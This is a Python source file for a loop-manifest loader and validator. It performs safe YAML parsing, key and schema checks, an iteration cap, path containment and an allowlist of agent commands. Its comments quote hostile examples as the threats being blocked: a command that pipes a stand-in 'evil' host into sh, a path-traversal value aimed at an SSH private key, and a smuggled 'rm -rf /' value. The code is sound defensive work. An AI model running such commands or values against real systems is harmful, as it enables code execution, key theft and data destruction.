"""
Manifest loader + validator.

Loads a `loop.yaml` and its referenced `bounds.yaml` from a loop folder,
validates both against the frozen schemas, and returns a single frozen
`LoopManifest` carrying built `Spec`/`Bounds` objects as fields. This is
the ONE shape `composition.py` consumes.

Enforces two hard validation rules:
  1. runner.default MUST be "stub", "shell", or "python_callable" (keyless).
  2. gate.kind in {agentassert, agentassay, skillfortify, attestar} is
     FORBIDDEN as a default (only allowed with --gate-override, at the CLI
     layer — not here).

Plus two security bounds:
  - max_iterations ceiling: hard cap of 1000, no manifest override.
  - path containment: spec/bounds/memory paths must resolve inside
    loop_dir — rejects path traversal (e.g. `spec: ../../../../.ssh/id_rsa`).

No I/O escape hatch: PyYAML `safe_load()` only (never `yaml.load()` without
a Loader — that permits arbitrary Python object instantiation, a known CVE
class). No network, no subprocess.
"""

from __future__ import annotations

import os
import re
import shlex
from collections.abc import Mapping
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

import yaml
from yaml.nodes import MappingNode
from yaml.resolver import BaseResolver

from bounded_loops.domain.errors import ManifestError
from bounded_loops.domain.models import Bounds, Rung, Spec

# Shape check for runner.env_passthrough entries. See
# _load_env_passthrough's docstring for exactly what this regex does and
# does NOT guarantee.
_ENV_VAR_NAME_RE = re.compile(r"^[A-Z_][A-Z0-9_]*$")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

KEYLESS_RUNNERS = {"stub", "shell", "python_callable"}   # python_callable needs
                                                           # no API key — same
                                                           # trust tier as shell.

QUALIXAR_GATE_KINDS = {"agentassert", "agentassay", "skillfortify", "attestar"}

VALID_GATE_KINDS = {
    "command", "pytest", "composite", "axe", "osv", "checkov",
    "gitleaks", "semgrep", "trivy", "promptfoo", "great_expectations", "jsonschema",
} | QUALIXAR_GATE_KINDS

VALID_RUNGS = {"L1", "L2", "L3"}

VALID_PATTERNS = {
    "augmented-llm", "prompt-chaining", "routing",
    "parallelization", "orchestrator-workers",
    "evaluator-optimizer", "agents",
}

# Security hardening: a loop.yaml cannot legally request more laps
# than this without --allow-large-loop on the CLI (not the manifest).
MAX_ITERATIONS_CEILING = 1000

# M-1 fix: allowlist of binary basenames permitted as the first token of
# runner.agent_cmd. Mirrors the graph engine's CLI_PROFILES registry.
#
# Rationale: bounded-loops explicitly invites community loop PRs, which means
# loop.yaml arrives from untrusted authors. The manifest's `agent_cmd` field
# is loop-author-controlled shell that executes BEFORE the gate on every lap.
# Without a constraint, a malicious author submits `agent_cmd: "curl evil|sh"`
# and every user who runs that loop executes arbitrary code without any
# binary-level human review.
#
# The allowlist ensures the first token must be a binary that the project has
# deliberately vouched for. To add a new binary, open a PR to extend this
# set — the code review of that change IS the human gate before it ships.
# All currently shipped loops use runner.default: stub or python_callable and
# do not set agent_cmd, so no existing loop is affected by this constraint.
AGENT_CMD_ALLOWLIST: frozenset[str] = frozenset({
    "agy",       # Antigravity CLI
    "claude",    # Anthropic Claude Code CLI
    "codex",     # OpenAI Codex CLI
    "grok",      # xAI Grok CLI
    "muse",      # Muse CLI
    "python",    # Python interpreter
    "python3",   # Python 3 interpreter
    "true",      # POSIX no-op (exits 0, ignores all args — zero attack surface;
                 # admitted so trivial no-op test fixtures need no grant)
    "uv",        # uv run (Python project runner)
})

# Enterprise extension: operators that run their own internal agent CLIs can
# add basenames here via the environment rather than a code PR. Each entry added
# this way should carry a review note inside the adopting organisation's deployment
# configuration — the env var is the operator-level gate.
# Format: BOUNDED_LOOPS_EXTRA_AGENT_CMDS=acn-run,corp-agent
# Same shape as BOUNDED_LOOPS_CLI_ENV_GRANT (explicit opt-in, safe default of ∅).
_EXTRA_AGENT_CMDS_ENV = "BOUNDED_LOOPS_EXTRA_AGENT_CMDS"

_LOOP_KEYS = frozenset({
    "name", "description", "pattern", "role", "rung", "runner", "gate",
    "spec", "bounds", "memory", "forbid",
})
_BOUNDS_KEYS = frozenset({
    "max_iterations", "no_progress_window", "max_tokens", "max_wallclock_s",
    "sandbox", "quarantine_inputs", "schema", "trace", "require_approval",
})
_RUNNER_KEYS = frozenset({
    "default", "cassette", "agent_cmd", "module_path", "function_name",
    "env_passthrough", "image", "approve_policy",
})
_GATE_KEYS = frozenset({
    "kind", "run", "mode", "gates", "schema", "config", "severity", "checkpoint",
})


class _DuplicateYamlKeyError(yaml.YAMLError):
    def __init__(self, key: object) -> None:
        self.key = key
        super().__init__(f"duplicate key {key!r}")


class _UniqueKeySafeLoader(yaml.SafeLoader):
    """Safe YAML loader that rejects duplicate keys at every mapping level."""


def _construct_unique_mapping(
    loader: _UniqueKeySafeLoader, node: MappingNode, deep: bool = False
) -> dict[object, object]:
    mapping: dict[object, object] = {}
    for key_node, value_node in node.value:
        key = loader.construct_object(key_node, deep=deep)
        try:
            duplicate = key in mapping
        except TypeError as exc:
            raise yaml.YAMLError(f"mapping key {key!r} is not hashable") from exc
        if duplicate:
            raise _DuplicateYamlKeyError(key)
        mapping[key] = loader.construct_object(value_node, deep=deep)
    return mapping


_UniqueKeySafeLoader.add_constructor(BaseResolver.DEFAULT_MAPPING_TAG, _construct_unique_mapping)


# ---------------------------------------------------------------------------
# LoopManifest — the ONE shape
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class LoopManifest:
    """
    The ONE LoopManifest shape. `composition.wire()` consumes
    exactly these field names — this is the single source of truth.
    Internal carrier only — not exported to the domain layer.
    """
    name:        str
    spec:        Spec
    bounds:      Bounds
    runner_kind: str
    gate_kind:   str
    gate_config: dict
    rung:        Rung
    cassette:    Optional[str]
    raw:         dict
    loop_dir:    Path
    memory_path: Path
    env_passthrough: tuple[str, ...] = ()   # LAST field, WITH a default


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

def load(loop_dir: Path) -> LoopManifest:
    """
    Primary entry point. Raises ManifestError on any validation failure.
    Returns the single LoopManifest carrying built Spec/Bounds objects.
    Callers (cli.py, composition.py) access `manifest.spec` /
    `manifest.bounds` directly.
    """
    loop_dir = loop_dir.resolve()

    # ── Step 1: Read loop.yaml ──
    yaml_path = loop_dir / "loop.yaml"
    if not yaml_path.exists():
        raise ManifestError(f"loop.yaml not found in {loop_dir}")
    raw = _load_yaml_mapping(yaml_path, "loop.yaml")

    _reject_unknown_keys(raw, _LOOP_KEYS, "loop")

    # ── Step 2: Validate required top-level keys ──
    _require(raw, "name", yaml_path)
    _require(raw, "description", yaml_path)
    _require(raw, "pattern", yaml_path)
    _require(raw, "role", yaml_path)
    _require(raw, "rung", yaml_path)
    _require(raw, "runner", yaml_path)
    _require(raw, "gate", yaml_path)

    # ── Step 3: Validate enum values ──
    _require_nonempty_string(raw, "name", "loop.yaml")
    _require_nonempty_string(raw, "description", "loop.yaml")
    if not isinstance(raw["rung"], str) or raw["rung"] not in VALID_RUNGS:
        raise ManifestError(f"rung must be L1|L2|L3, got {raw['rung']!r}")
    if not isinstance(raw["pattern"], str) or raw["pattern"] not in VALID_PATTERNS:
        raise ManifestError(
            f"loop.yaml: pattern {raw['pattern']!r} is not one of Anthropic's seven "
            f"agentic patterns. Valid values: {sorted(VALID_PATTERNS)}. "
            f"See https://www.anthropic.com/engineering/building-effective-agents "
            f"for definitions."
        )
    _validate_string_list(raw["role"], "role")
    if "forbid" in raw:
        _validate_string_list(raw["forbid"], "forbid", allow_empty=True)

    # ── Step 4: Validate runner ──
    runner_block = raw["runner"]
    if not isinstance(runner_block, dict) or "default" not in runner_block:
        raise ManifestError("runner.default is required")
    _reject_unknown_keys(runner_block, _RUNNER_KEYS, "runner")
    runner_kind = runner_block["default"]
    if not isinstance(runner_kind, str) or runner_kind not in KEYLESS_RUNNERS:
        raise ManifestError(
            f"runner.default must be stub|shell|python_callable (keyless) for a "
            f"default manifest; got {runner_kind!r}. Use --runner on the CLI to "
            f"override at runtime."
        )
    cassette = runner_block.get("cassette")  # optional override; None → adapter default
    # hardening: unlike spec/bounds/memory, runner.cassette was
    # taken verbatim — an absolute or `../` path (Path("/loop") / "/tmp/x" ==
    # "/tmp/x") let a loop load an EXTERNAL cassette that also escaped the
    # trust-store content hash. Contain it inside loop_dir here, at load time.
    if cassette is not None:
        if not isinstance(cassette, str) or not cassette:
            raise ManifestError("runner.cassette must be a non-empty string when given")
        _resolve_contained(loop_dir, cassette, "runner.cassette")  # raises on escape

    # M-1 fix: validate agent_cmd against AGENT_CMD_ALLOWLIST. This runs
    # for ALL runner kinds so a stub/python_callable manifest cannot sneak
    # in an agent_cmd field pointing at an unlisted binary.
    agent_cmd = runner_block.get("agent_cmd")
    if agent_cmd is not None:
        _validate_agent_cmd(agent_cmd)

    # python_callable requires module_path (required, non-empty string) and
    # accepts an optional function_name (default "run_turn", non-empty
    # string if given). Validated HERE, at manifest-load time, so a missing/
    # bad module_path surfaces as a clean ManifestError rather than an
    # opaque TypeError from importlib.import_module(None) inside the
    # isolated subprocess.
    if runner_kind == "python_callable":
        module_path = runner_block.get("module_path")
        if not isinstance(module_path, str) or not module_path:
            raise ManifestError(
                "runner.module_path is required for runner.default: python_callable"
            )
        function_name = runner_block.get("function_name", "run_turn")
        if not isinstance(function_name, str) or not function_name:
            raise ManifestError(
                "runner.function_name must be a non-empty string when given "
                "for runner.default: python_callable"
            )

    # ── Step 5: Validate gate ──
    gate_block = raw["gate"]
    if not isinstance(gate_block, dict) or "kind" not in gate_block:
        raise ManifestError(
            "loop.yaml: gate.kind is required. "
            "Add a gate block, for example:\n"
            "  gate:\n"
            "    kind: command\n"
            "    run: \"python3 seed/check.py\""
        )
    _validate_gate_config(gate_block, "gate")
    gate_kind = gate_block["kind"]
    if not isinstance(gate_kind, str) or gate_kind not in VALID_GATE_KINDS:
        user_visible_kinds = sorted(VALID_GATE_KINDS - QUALIXAR_GATE_KINDS)
        raise ManifestError(
            f"loop.yaml: gate.kind {gate_kind!r} is not a recognized kind. "
            f"Valid kinds: {user_visible_kinds}. "
            f"Check for a typo. For Qualixar product gates (agentassert, agentassay, "
            f"skillfortify, attestar), use --gate-override on the CLI instead of "
            f"setting them in loop.yaml."
        )
    if gate_kind in QUALIXAR_GATE_KINDS:
        raise ManifestError(
            f"gate.kind {gate_kind!r} is a Qualixar product gate and is FORBIDDEN "
            f"as a manifest default. Use --gate-override on the CLI instead."
        )
    gate_run = gate_block.get("run")  # str | None (required for kind=command)
    if gate_kind == "command" and gate_run is None:
        raise ManifestError(
            "loop.yaml: gate.run is required when gate.kind=command. "
            "Add gate.run: \"<your-check-command>\" — for example: "
            "gate.run: \"python3 seed/check.py\" or gate.run: \"pytest -q\"."
        )
    if gate_kind == "composite":
        _validate_composite_gate(gate_block)
    # gate_config merges "run" + every other gate.* key into ONE dict —
    # this is what composition.py passes as **kwargs to non-command gates.
    gate_config = {k: v for k, v in gate_block.items() if k != "kind"}

    # ── Step 6: Resolve + CONTAIN paths ──
    spec_rel = _path_field(raw, "spec", "PROMPT.md")
    bounds_rel = _path_field(raw, "bounds", "bounds.yaml")
    memory_rel = _path_field(raw, "memory", "STATE.md")
    spec_path = _resolve_contained(loop_dir, spec_rel, "spec")
    bounds_path = _resolve_contained(loop_dir, bounds_rel, "bounds")
    memory_path = _resolve_contained(loop_dir, memory_rel, "memory")

    # ── Step 7: Load PROMPT.md → build Spec ──
    if not spec_path.exists():
        raise ManifestError(f"spec file {spec_path} not found")
    spec_text = spec_path.read_text(encoding="utf-8").strip()
    spec = Spec(
        name=raw["name"],
        goal=raw["description"],
        steps=(spec_text,),  # single step = the full prompt; gate proves stop
        stop_condition=f"gate {gate_kind} passes",
        forbid=tuple(raw.get("forbid", [])),
    )

    # ── Step 8: Load + validate bounds.yaml → build Bounds ──
    bounds = _load_bounds(bounds_path, loop_dir)

    # ── Step 9: parse + validate env_passthrough ──
    env_passthrough = _load_env_passthrough(runner_block)

    return LoopManifest(
        name=raw["name"],
        spec=spec,
        bounds=bounds,
        runner_kind=runner_kind,
        gate_kind=gate_kind,
        gate_config=gate_config,
        rung=Rung(raw["rung"]),
        cassette=cassette,
        raw=raw,
        loop_dir=loop_dir,
        memory_path=memory_path,
        env_passthrough=env_passthrough,
    )


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _resolve_contained(loop_dir: Path, rel: str, field_name: str) -> Path:
    """
    Security fix: resolve a manifest-relative path and REJECT any
    path that escapes loop_dir via '..' or a symlink. Prevents a malicious
    loop.yaml (e.g. `spec: ../../../../.ssh/id_rsa`) from reading files
    outside the loop folder and injecting them into the agent prompt.
    """
    resolved = (loop_dir / rel).resolve()
    loop_dir_resolved = loop_dir.resolve()
    if not resolved.is_relative_to(loop_dir_resolved):
        raise ManifestError(
            f"loop.yaml: '{field_name}: {rel}' resolves outside the loop "
            f"folder ({resolved} is not inside {loop_dir_resolved}) — rejected."
        )
    return resolved


def _load_yaml_mapping(path: Path, label: str) -> dict:
    try:
        raw = yaml.load(path.read_text(encoding="utf-8"), Loader=_UniqueKeySafeLoader)
    except _DuplicateYamlKeyError as exc:
        raise ManifestError(f"{label}: duplicate key {exc.key!r}") from exc
    except yaml.YAMLError as exc:
        raise ManifestError(f"{label} at {path} is not valid YAML: {exc}") from exc
    if raw is None:
        raise ManifestError(f"{label} is empty ({path})")
    if not isinstance(raw, dict):
        raise ManifestError(f"{label} must contain a mapping at the document root")
    return raw


def _reject_unknown_keys(values: Mapping[object, object], allowed: frozenset[str], section: str) -> None:
    unknown = sorted((key for key in values if key not in allowed), key=repr)
    if unknown:
        # Name the file so the author knows exactly where to look.
        file_hint = "bounds.yaml" if section == "bounds" else "loop.yaml"
        raise ManifestError(
            f"{file_hint} [{section}]: unknown key {unknown[0]!r}. "
            f"Valid keys for this section: {sorted(allowed)}. "
            f"Remove or rename this key, or check for a typo."
        )


def _require_nonempty_string(values: Mapping[object, object], field_name: str, section: str) -> str:
    value = values[field_name]
    if not isinstance(value, str) or not value.strip():
        raise ManifestError(f"{section}: {field_name} must be a non-empty string")
    return value


def _validate_string_list(value: object, field_name: str, *, allow_empty: bool = False) -> None:
    if not isinstance(value, list) or (not allow_empty and not value):
        qualifier = "possibly empty " if allow_empty else "non-empty "
        raise ManifestError(f"{field_name} must be a {qualifier}list of non-empty strings")
    if any(not isinstance(entry, str) or not entry.strip() for entry in value):
        raise ManifestError(f"{field_name} must be a list of non-empty strings")


def _path_field(values: Mapping[object, object], field_name: str, default: str) -> str:
    value = values.get(field_name, default)
    if not isinstance(value, str) or not value.strip():
        raise ManifestError(f"loop.yaml: {field_name} must be a non-empty string")
    return value


def _validate_gate_config(gate_block: dict, section: str) -> None:
    _reject_unknown_keys(gate_block, _GATE_KEYS, section)
    kind = gate_block.get("kind")
    if not isinstance(kind, str) or not kind:
        raise ManifestError(f"{section}.kind must be a non-empty string")
    for field_name in ("run", "schema", "config", "severity", "checkpoint"):
        if field_name in gate_block:
            value = gate_block[field_name]
            if not isinstance(value, str) or not value.strip():
                raise ManifestError(f"{section}.{field_name} must be a non-empty string")
    if "mode" in gate_block and (not isinstance(gate_block["mode"], str) or not gate_block["mode"].strip()):
        raise ManifestError(f"{section}.mode must be a non-empty string")
    if kind == "composite":
        gates = gate_block.get("gates")
        if not isinstance(gates, list) or not gates:
            raise ManifestError(f"{section}.gates must be a non-empty gates list")
        for index, child in enumerate(gates):
            if not isinstance(child, dict):
                raise ManifestError(f"{section}.gates[{index}] must be an object")
            _validate_gate_config(child, f"{section}.gates[{index}]")


def _positive_int(value: object, field_name: str, *, allow_none: bool = False) -> int | None:
    if value is None and allow_none:
        return None
    if not isinstance(value, int) or isinstance(value, bool):
        suffix = " or null" if allow_none else ""
        raise ManifestError(f"{field_name} must be an integer{suffix}")
    if value < 1:
        if field_name == "max_iterations":
            raise ManifestError("max_iterations must be at least 1 (positive int)")
        raise ManifestError(f"{field_name} must be at least 1")
    return value


def _strict_bool(value: object, field_name: str, *, allow_none: bool = False) -> bool | None:
    if value is None and allow_none:
        return None
    if type(value) is not bool:
        suffix = " or null" if allow_none else ""
        raise ManifestError(f"{field_name} must be a boolean{suffix}")
    return value


def _load_bounds(bounds_path: Path, loop_dir: Path) -> Bounds:
    if not bounds_path.exists():
        raise ManifestError(f"bounds.yaml not found: {bounds_path}")
    raw = _load_yaml_mapping(bounds_path, "bounds.yaml")
    _reject_unknown_keys(raw, _BOUNDS_KEYS, "bounds")
    if "max_iterations" not in raw:
        raise ManifestError(f"bounds.yaml: max_iterations is required ({bounds_path})")
    max_iter = _positive_int(raw["max_iterations"], "max_iterations")
    assert max_iter is not None
    # Security fix: an unbounded max_iterations + null max_wallclock_s
    # + null max_tokens is an effectively-unbounded-cost loop. Cap it.
    if max_iter > MAX_ITERATIONS_CEILING:
        raise ManifestError(
            f"max_iterations={max_iter} exceeds the {MAX_ITERATIONS_CEILING} "
            f"ceiling, which is hard and non-overridable in v1 — no CLI flag "
            f"exists to raise it. Split the loop or lower max_iterations."
        )
    no_progress_window = _positive_int(raw.get("no_progress_window", 3), "no_progress_window")
    assert no_progress_window is not None
    max_tokens = _positive_int(raw.get("max_tokens"), "max_tokens", allow_none=True)
    max_wallclock_s = _positive_int(raw.get("max_wallclock_s"), "max_wallclock_s", allow_none=True)
    # Security fix: null wallclock does NOT mean "unlimited" — it
    # means "use the conservative platform default" (1 hour). A loop that
    # genuinely needs longer must say so explicitly in bounds.yaml.
    if max_wallclock_s is None:
        max_wallclock_s = 3600
    sandbox = _strict_bool(raw.get("sandbox", True), "sandbox")
    quarantine_inputs = _strict_bool(raw.get("quarantine_inputs", True), "quarantine_inputs")
    trace = _strict_bool(raw.get("trace", True), "trace")
    require_approval = _strict_bool(raw.get("require_approval"), "require_approval", allow_none=True)
    assert sandbox is not None
    assert quarantine_inputs is not None
    assert trace is not None
    schema = raw.get("schema")
    if schema is not None:
        if not isinstance(schema, str) or not schema.strip():
            raise ManifestError("schema must be a non-empty string or null")
        _resolve_contained(loop_dir, schema, "bounds.schema")
    return Bounds(
        max_iterations=max_iter,
        no_progress_window=no_progress_window,
        max_tokens=max_tokens,
        max_wallclock_s=max_wallclock_s,
        sandbox=sandbox,
        quarantine_inputs=quarantine_inputs,
        schema=schema,
        trace=trace,
        require_approval=require_approval,
    )


def _require(d: dict, key: str, path: Path) -> None:
    if key not in d:
        raise ManifestError(f"loop.yaml missing required key {key!r} ({path})")


def _validate_composite_gate(gate_block: dict) -> None:
    mode = gate_block.get("mode", "all")
    if mode != "all":
        raise ManifestError("gate.kind=composite supports only mode: all in v1")
    gates = gate_block.get("gates")
    if not isinstance(gates, list) or not gates:
        raise ManifestError("gate.kind=composite requires a non-empty gates list")
    for index, child in enumerate(gates):
        if not isinstance(child, dict):
            raise ManifestError(f"gate.gates[{index}] must be an object")
        child_kind = child.get("kind")
        if child_kind == "composite":
            raise ManifestError("nested composite gates are not supported in v1")
        if child_kind not in VALID_GATE_KINDS:
            raise ManifestError(f"gate.gates[{index}].kind {child_kind!r} is not recognized")
        if child_kind in QUALIXAR_GATE_KINDS:
            raise ManifestError(
                f"gate.gates[{index}].kind {child_kind!r} is a Qualixar product gate "
                "and is FORBIDDEN as a manifest default."
            )
        if child_kind == "command" and child.get("run") is None:
            raise ManifestError(f"gate.gates[{index}].run is required when kind=command")


def _validate_agent_cmd(agent_cmd: object) -> None:
    """M-1 fix: constrain runner.agent_cmd to AGENT_CMD_ALLOWLIST binaries.

    Checks the basename of the first token (the binary) against the effective
    allowlist (AGENT_CMD_ALLOWLIST union any operator-supplied extensions from
    BOUNDED_LOOPS_EXTRA_AGENT_CMDS). Absolute paths are permitted as long as
    their basename is in the effective set (e.g. /usr/local/bin/claude → 'claude').

    Shell metacharacters in the full string are not a concern here because
    ShellRunner already uses shlex.split + shell=False, preventing shell
    reinterpretation; this check is specifically about which binary is launched.
    """
    if not isinstance(agent_cmd, str) or not agent_cmd.strip():
        raise ManifestError("runner.agent_cmd must be a non-empty string when given")
    try:
        tokens = shlex.split(agent_cmd)
    except ValueError as exc:
        raise ManifestError(
            f"runner.agent_cmd {agent_cmd!r} has invalid shell quoting: {exc}"
        ) from exc
    if not tokens:
        raise ManifestError("runner.agent_cmd is empty after parsing")
    binary_basename = Path(tokens[0]).name
    extra_raw = os.environ.get(_EXTRA_AGENT_CMDS_ENV, "")
    extra: frozenset[str] = frozenset(
        name.strip() for name in extra_raw.split(",") if name.strip()
    )
    effective = AGENT_CMD_ALLOWLIST | extra
    if binary_basename not in effective:
        raise ManifestError(
            f"runner.agent_cmd first token {binary_basename!r} is not in the "
            f"agent_cmd allowlist ({sorted(AGENT_CMD_ALLOWLIST)}). "
            f"To allow a new binary: open a PR to extend AGENT_CMD_ALLOWLIST "
            f"in bounded_loops/application/manifest.py (the code review is "
            f"the human gate), OR set "
            f"{_EXTRA_AGENT_CMDS_ENV}={binary_basename} in your deployment "
            f"environment for an enterprise-local extension (document the review "
            f"decision in your deployment configuration)."
        )


def _load_env_passthrough(runner_block: dict) -> tuple[str, ...]:
    """
    Validates runner.env_passthrough (optional). Each entry must be a
    non-empty string matching a conservative env-var-name shape
    (uppercase letters, digits, underscore, must not start with a digit).

    correction: this regex is
    a SHAPE check only. It is NOT an authorization control and does NOT
    decide which secrets may be passed through — it only rejects a string
    that isn't a syntactically legal env-var NAME (so a malformed value
    like "PATH; rm -rf /" is rejected). A syntactically valid name can
    still be a live secret: "AWS_SECRET_ACCESS_KEY" and "GITHUB_TOKEN"
    both pass this regex cleanly. Do not read "rejected before it reaches
    a subprocess env dict" as a security guarantee about WHICH vars are
    safe to pass — it only guarantees the STRING is name-shaped. The real
    authorization boundary is an operator-level allowlist enforced by the
    consuming wiring at wire()-time
    — a loop.yaml naming a syntactically valid but non-operator-allowlisted
    var MUST be refused there, not here. This function's job ends at "is
    this a legal name," and that boundary is deliberate, not an oversight:
    manifest.py has no concept of "the operator's environment" to check
    against, so the authorization decision cannot live here.
    """
    raw_list = runner_block.get("env_passthrough")
    if raw_list is None:
        return ()
    if not isinstance(raw_list, list):
        raise ManifestError(
            "loop.yaml: runner.env_passthrough must be a list of strings, "
            f"got {type(raw_list).__name__}"
        )
    validated = []
    for entry in raw_list:
        if not isinstance(entry, str) or not _ENV_VAR_NAME_RE.fullmatch(entry):
            raise ManifestError(
                f"loop.yaml: runner.env_passthrough entry {entry!r} is not "
                "a valid environment variable name (uppercase letters, "
                "digits, underscore; must not start with a digit)"
            )
        validated.append(entry)
    return tuple(validated)
